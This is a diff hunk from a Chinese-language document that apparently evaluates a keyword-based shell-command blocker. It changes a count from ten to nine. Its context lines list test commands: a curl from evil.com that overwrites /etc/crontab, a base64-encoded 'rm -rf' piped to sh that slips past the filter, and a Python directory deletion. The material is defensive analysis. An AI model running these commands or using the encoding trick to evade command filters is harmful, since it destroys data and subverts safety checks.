@@ -320,7 +320,7 @@ curl -o /etc/crontab http://evil.com/payload   # 看似下载，实则覆盖系�
 | `python3 -c "import shutil; shutil.rmtree('logs')"` | 删 `logs/` | **放行** |
 | `echo cm0gLXJmIGxvZ3M= \| base64 -d \| sh` | 先解码出 `rm -rf logs` 再执行 | **放行** |
 
-十条里拦下两条。而且和 S-3 一样，它拦下的 `rm -rf logs` 恰恰可能是一条没问题的命令。**同时太严又太松**，因为它根本没在看后果。
+九条里拦下两条。而且和 S-3 一样，它拦下的 `rm -rf logs` 恰恰可能是一条没问题的命令。**同时太严又太松**，因为它根本没在看后果。
 
 ### 解析在做什么
 
